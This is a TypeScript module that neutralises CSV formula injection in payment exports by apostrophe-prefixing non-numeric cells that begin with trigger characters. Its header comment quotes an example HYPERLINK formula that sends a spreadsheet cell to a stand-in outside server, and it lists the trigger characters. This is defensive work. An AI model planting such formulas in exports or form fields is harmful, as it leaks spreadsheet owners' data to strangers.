/**
 * CSV that a spreadsheet opens as data, never as instructions.
 *
 * ─────────────────────────────────────────────────────────────────────────────
 * WHY QUOTING IS NOT ENOUGH
 *
 * Both money exports built their rows like this:
 *
 *     `"${String(cell).replace(/"/g, '""')}"`
 *
 * which is correct CSV and no defence at all. Excel, LibreOffice and Google
 * Sheets evaluate a cell whose VALUE begins with `=`, `+`, `-` or `@` after
 * parsing the quotes away. So a client called
 *
 *     =HYPERLINK("https://example.invalid/?x="&A1,"Invoice")
 *
 * becomes a working link in the owner's spreadsheet that carries a cell of
 * their own data to someone else's server, and the owner clicked nothing but
 * "Export".
 *
 * ─────────────────────────────────────────────────────────────────────────────
 * AND THE NAME IS NOT OURS TO TRUST
 *
 * This is not a theoretical payload. `POST /api/website/forms/contact` takes no
 * authentication — it is the public contact form on the business's own site —
 * and writes what it is given to `crm_contacts.first_name`. The same is true of
 * the booking form. Every name in a money export came from a stranger typing
 * into a public page, and a formula is shorter than a surname.
 *
 * ─────────────────────────────────────────────────────────────────────────────
 * NUMBERS STAY NUMBERS
 *
 * The obvious fix — prefix anything starting with a dangerous character — turns
 * `-500.00` into text, and an accountant's column stops summing. So a cell that
 * IS a number is left exactly as it is, and only a non-numeric cell beginning
 * with one of those characters is neutralised. `-1+1` is not a number and is
 * therefore handled; `-1` is, and is not touched.
 *
 * @module lib/payments/csv
 */

/**
 * Characters a spreadsheet reads as the start of an expression.
 *
 * Tab and carriage return are in the list because Excel has historically
 * stripped leading whitespace before deciding, so `\t=cmd` arrives at the same
 * place as `=cmd`.
 */
const TRIGGERS = ['=', '+', '-', '@', '\t', '\r'];

/** Does this text read as a plain number to a spreadsheet? */
function isNumeric(text: string): boolean {
  if (!text.trim()) return false;
  return Number.isFinite(Number(text.replace(/,/g, '')));
}

/**
 * One cell's value, safe to place in a spreadsheet.
 *
 * Prefixed with an apostrophe, which every major spreadsheet reads as "the rest
 * of this is text" and does not display. The alternative — stripping the
 * character — would silently alter the owner's own data, and a service genuinely
 * called "+VAT" should survive its own export.
 */
export function csvCell(value: unknown): string {
  const text = value === null || value === undefined ? '' : String(value);

  if (text && TRIGGERS.includes(text[0]) && !isNumeric(text)) {
    return `'${text}`;
  }

  return text;
}

/**
 * A matrix as a CSV document.
 *
 * `\r\n` because that is what the format specifies and what Excel expects; a
 * bare `\n` is read correctly by most tools and not by all of them.
 */
export function toCsv(rows: (string | number | null | undefined)[][]): string {
  return rows
    .map(row => row.map(cell => `"${csvCell(cell).replace(/"/g, '""')}"`).join(','))
    .join('\r\n');
}

/**
 * The byte sequence that makes Excel read a file as UTF-8.
 *
 * Without it Hebrew names arrive as mojibake, and the client-name column is
 * exactly where the Hebrew is.
 */
export const CSV_BOM = '﻿';

/** A complete CSV file, ready to download or attach. */
export function toCsvFile(rows: (string | number | null | undefined)[][]): string {
  return `${CSV_BOM}${toCsv(rows)}`;
}
